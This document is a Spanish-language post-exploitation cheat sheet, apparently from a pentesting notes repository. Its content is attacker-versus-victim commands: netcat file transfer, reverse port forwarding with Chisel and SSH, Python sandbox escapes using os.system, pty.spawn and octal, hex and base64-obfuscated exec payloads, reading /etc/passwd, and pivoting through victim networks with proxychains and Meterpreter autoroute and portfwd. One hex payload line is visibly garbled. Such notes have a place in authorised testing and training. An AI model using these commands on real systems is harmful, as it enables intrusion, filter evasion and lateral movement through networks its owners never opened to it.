# Postexplotacion

1. [Escalado de privilegios](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#Escalado-de-privilegios)
	* [Linux](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md)
	* [Windows](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md)
1. [Transferencia de archivos](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#transferencia-de-archivos)
1. [Port Forwarding](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#port-forwarding)
1. [Saltando sandbox](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#saltando-sandbox)
1. [Meterpreter](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#meterpreter)
1. [Pivoteando](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting#pivoteando)

## Escalado de privilegios

* [Linux](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Linux.md)
* [Windows](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md)

## Transferencia de archivos

### Netcat

```bash
#envio archivo
nc x.x.x.x port < file.txt
#recibo archivo
nc -lvnp port > file.txt
```

Web Server con NC
```bash
while:; do nc -q 0 -l 80 <<EOF
HTTP/1.1 200 OK
Content-Type: Text/html

<html>
	<body>
		<h1>Current Date is $(date)</h1>
	</body>
</html>
EOF
done
```

## Port Forwarding

Para mandar un servicio que esta corriendo solo para el host local, hacia hosts remotos (o red local a red externa). Tambien puede servir para servicios que necesitan de GUI y no se pueden levantar desde una shell

### SSH
```bash
Local
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
Remote
ssh -R remotePort:localhost:localPort x.x.x.x
Dinamico
ssh -D <local proxy port> -p <remote port> <target>
```

### Chisel
```bash
#atacante
$chisel server -p 9999 --reverse
#victima
$chisel client IPAtacante:9999 R:RPort:127.0.0.1:LPort
```

### sshuttle
```bash
sshuttle -vvr user@x.x.x.x
```

### Plink (windows)
```bash
plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
```

* [sshuttle](https://github.com/sshuttle/sshuttle)

## Saltando sandbox

### Python

#### OS Command execution

```bash
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.popen("ls").read()
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')
```

#### Octal

```bash
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
```

#### Hexa
```bash
exec("\x5f\x5f\x69\x6d\xIf youca70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
```

#### b64

```bash
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #
```

Py2
```bash
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```

## Meterpreter

	* [Meterpreter]

## Pivoteando

### Meterpreter

```bash
>run autoroute -s IP_red_victima/MASK

#sshutle
```

### General

```
1) transferir Chisel a la maquina victima

2) en maquina atacante
$./chisel server -p 1337 --reverse

3) en maquina victima
$./chisel client 192.168.1.1:1337 R:socks #linux
>chisel.exe client 192.168.1.1:1337 R:socks #windows

4) si todo correcto en maquina atacante recibimos
2021/01/15 17:11:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

5) agregamos esta linea al /etc/proxychains.conf
socks5 127.0.0.1 1080 #el puerto de 4

6) tiramos comandos a traves de proxychains
#ejemplo
$proxychains nmap -sS IP_victima2
```

### Linux
```bash
#Agregar ruta
ip route add [net/mask] via [gatewayip] dev [device]
```

### Windows
```powershell
route add [subnet] [netmask] [meterpreterSessionId]
```

```powershell
//Descomprimir el archivo
powershell -command "Expand-Archive 'C:\openssh.zip' c:\ruta\"

//Instalar el openSSH
powershell -ExecutionPolicy Bypass -File c:\install-sshd.ps1

//a√±adir reglas al firewall
powershell -Command "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"

//empezar el sshd service
net start sshd

//Desde el host, linux en este caso
ssh -ACv -D <tunnel_port> <windows-user>@<windows-ip>
```

### Meterpreter
```
#una vez hechas las rutas en el SO victima
ms6> route add [subnet] [netmask] [meterpreterSessionId]
ms6> use auxiliary/server/socks_proxy
set version 4a
set srvport 9050
run -j

Desde aca podemos usar proxychains o usar el proxy 127.0.0.1:9050 para navegar en las redes privadas
```

#### portforwarding
```
meterpreter> portfwd add -l [localport_atacante] -p [remoteport_victima] -r [remotehost_victima]
meterpreter> portfwd list (para comprobar)
meterpreter> bg
msf6> nmap -sS -sV -p [localport_recienConfigurado] localhost
exploit normalmente como si llegaramos a la IP
```

